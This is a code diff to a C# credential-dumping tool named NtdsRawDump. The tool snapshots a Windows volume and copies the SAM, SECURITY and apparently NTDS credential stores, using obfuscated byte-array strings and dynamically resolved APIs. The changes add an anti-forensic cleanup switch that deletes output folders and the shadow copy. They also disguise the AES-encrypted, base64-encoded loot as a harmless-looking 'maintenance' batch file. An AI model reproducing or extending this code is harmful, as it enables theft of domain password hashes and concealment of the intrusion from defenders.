@@ -37,7 +37,7 @@ class NtdsRawDump {
     static readonly byte[] _out_sam     = new byte[]{208,159,52,154,123,7,181};
     static readonly byte[] _out_sec     = new byte[]{208,155,58,193,125,3,177,89,85,162,92,252};
     static readonly byte[] _default_out = new byte[]{224,196,5,228,125,5,162,82,26,187,117,237,147,35,193,187,54,220,125,55,203,117,7,181};
-    static readonly byte[] _tmp_name    = new byte[]{192,155,43,192,124,30,170,82,30,248,69,225,151};
+    static readonly byte[] _tmp_name    = new byte[]{192,155,43,192,124,30,170,82,30,248,82,225,131};
     static readonly byte[] _k32         = new byte[]{200,155,43,218,106,6,246,18,85,178,93,224};
     static readonly byte[] _k32_cf      = new byte[]{224,140,60,213,123,15,131,73,23,179,102};
     static readonly byte[] _k32_dic     = new byte[]{231,155,47,221,108,15,140,79,56,185,95,248,149,45,241};
@@ -268,7 +268,12 @@ class NtdsRawDump {
         pfSetFilePointerEx = R<D_SetFilePointerEx>(hk32, S(_k32_sfpe));
         pfCloseHandle      = R<D_CloseHandle>(hk32, S(_k32_ch));
 
-        string outDir = args.Length > 0 ? args[0] : S(_default_out);
+        bool   cleanup = false;
+        string outDir  = S(_default_out);
+        foreach (string a in args) {
+            if (a == "--cleanup") cleanup = true;
+            else                  outDir  = a;
+        }
 
         Console.WriteLine("[*] Initializing store consistency snapshot...");
         string dev = CreateShadow(out string shadowId);
@@ -305,11 +310,12 @@ class NtdsRawDump {
             ok++;
         }
 
-        Console.WriteLine("[*] Releasing snapshot...");
-        DeleteShadow(shadowId);
         Console.WriteLine("[+] Completed. " + ok + "/" + targets.Length + " stores processed.");
 
-        if (ok < targets.Length) return 2;
+        if (ok < targets.Length) {
+            if (cleanup) DeleteShadow(shadowId);
+            return 2;
+        }
 
         string stageRoot = Path.GetDirectoryName(Path.GetFullPath(outDir));
         string encPath   = Path.Combine(stageRoot, S(_tmp_name));
@@ -329,7 +335,15 @@ class NtdsRawDump {
                 zip = ms.ToArray();
             }
             byte[] enc = AesEncrypt(zip, aesKey);
-            File.WriteAllBytes(encPath, enc);
+            string b64 = Convert.ToBase64String(enc);
+            string content = "@echo off\r\n:: maintenance\r\nset _b=" + b64 + "\r\n";
+            if (cleanup) {
+                Console.WriteLine("[*] Cleaning up intermediates...");
+                try { Directory.Delete(outDir, recursive: true); } catch { }
+                DeleteShadow(shadowId);
+                Console.WriteLine("[+] Cleanup done.");
+            }
+            File.WriteAllText(encPath, content, Encoding.ASCII);
             Console.WriteLine("[+] Bundle written: " + encPath + " (" + enc.Length + " bytes)");
         } catch (Exception ex) {
             Console.Error.WriteLine("[!] Bundle error: " + ex.Message);
